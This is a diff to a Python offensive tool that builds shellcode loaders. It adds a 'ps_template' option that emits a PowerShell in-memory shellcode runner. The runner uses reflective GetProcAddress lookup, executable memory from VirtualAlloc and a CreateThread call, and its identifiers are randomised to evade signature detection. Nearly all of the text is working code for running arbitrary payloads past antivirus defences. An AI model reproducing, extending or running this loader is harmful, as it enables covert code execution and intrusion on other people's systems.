@@ -1,4 +1,4 @@
-import hashlib, os, sys, argparse
+import hashlib, os, sys, argparse, string, random
 from base64 import encode                                                                                                                                                                                                                                                                                                                                                                            
 from Crypto.Cipher import AES                                                                                                                                                                                                                                                                                                                                                                        
 from Crypto.Util.Padding import pad                                                                                                                                                                                                                                                                                                                                                                  
@@ -710,6 +710,49 @@ namespace CLMBypass
 
 """
 
+PS_TEMPLATE = """
+function %s {
+    Param ($%s, $%s)
+    $%s = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $%s=@()
+    $%s.GetMethods() | %% {If($_.Name -eq "GetProcAddress") {$%s+=$_}}
+    return $%s[0].Invoke($null, @(($%s.GetMethod('GetModuleHandle')).Invoke($null, @($%s)), $%s))
+}
+
+function %s {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $%s,
+        [Parameter(Position = 1)] [Type] $%s = [Void]
+    )
+    $%s = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+    $%s.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%s).SetImplementationFlags('Runtime, Managed')
+    $%s.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%s, $%s).SetImplementationFlags('Runtime, Managed')
+    return $%s.CreateType()
+}
+$%s = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll VirtualAlloc), (%s @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+[Byte[]] $%s = %s 
+[System.Runtime.InteropServices.Marshal]::Copy($%s, 0, $%s, $%s.length)
+
+$%s = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll CreateThread), (%s @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$%s,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll WaitForSingleObject), (%s @([IntPtr], [Int32])([Int]))).Invoke($%s, 0xFFFFFFFF)
+
+"""
+# dumbest possible way to do this params
+letters = string.ascii_letters
+lookupfunc = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+modulename = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+functionanme = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+getdeltype = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+funcvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+deltypevar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+typevar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+assem = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+tmpvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+lpmem= ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+bufvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+hthread = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
+
+
 def format_shellcode(shellcode):                                                                                                                                                                                                                                                                                                                                                                     
     hshellcode = ""
     code_size = len(shellcode)                                                                                                                                                                                                                                                                                                                                                                       
@@ -738,11 +781,39 @@ parser = argparse.ArgumentParser(description="generate .NET executable to run AE
 parser.add_argument('-inbin', type=str, help=".bin file")
 parser.add_argument('--arch', type=str, choices=['x86', 'x64'], default="x64")
 parser.add_argument('--outfile', type=str, default="out.exe")
-parser.add_argument('--type', type=str, choices=['exe', 'workflowcompiler', 'msbuild', 'installutil'], default="exe")
+parser.add_argument('--type', type=str, choices=['exe', 'workflowcompiler', 'msbuild', 'installutil', 'ps_template'], default="exe")
 parser.add_argument('--verbose', default=False, action='store_true', dest='verbose')
 parser.add_argument('--pretty', default=False, action='store_true', dest='pretty')
 args = parser.parse_args()
 input_filename = args.inbin
+
+if args.type == "ps_template":
+    with open(input_filename, "rb") as file: plain_data = file.read()
+    p_shc = format_shellcode(plain_data)
+    run_txt = PS_TEMPLATE % (
+        lookupfunc, 
+        modulename, functionanme, 
+        assem,
+        tmpvar,
+        assem, tmpvar, 
+        tmpvar, assem, modulename, functionanme, 
+        getdeltype, 
+        funcvar, 
+        deltypevar, 
+        typevar, 
+        typevar, funcvar, 
+        typevar, deltypevar, funcvar, 
+        typevar, 
+        lpmem, lookupfunc, getdeltype, 
+        bufvar, p_shc, 
+        bufvar, lpmem, bufvar, 
+        hthread, lookupfunc, getdeltype, lpmem, 
+        lookupfunc, getdeltype, hthread)
+    if args.verbose:
+        print(run_txt)
+    with open("run.txt", "w") as f_run: f_run.write(run_txt)
+    exit(0)
+
 with open(input_filename, "rb") as file: data = file.read()
 # encrypt payload
 key = get_random_bytes(16)
